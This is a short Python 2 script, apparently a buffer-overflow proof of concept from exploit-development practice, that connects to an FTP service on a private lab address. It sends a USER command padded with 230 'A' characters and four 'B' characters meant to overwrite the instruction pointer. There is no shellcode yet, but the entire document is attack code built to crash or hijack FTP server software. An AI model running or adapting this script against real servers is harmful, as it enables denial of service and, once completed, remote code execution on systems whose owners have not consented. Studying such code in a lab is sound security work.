#!/usr/bin/python
import socket
import sys

junk = 'A'*230
eip = 'B'*4
injection = junk+eip

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.129.128',21))
s.recv(1024)
s.send('USER '+injection+'\r\n')
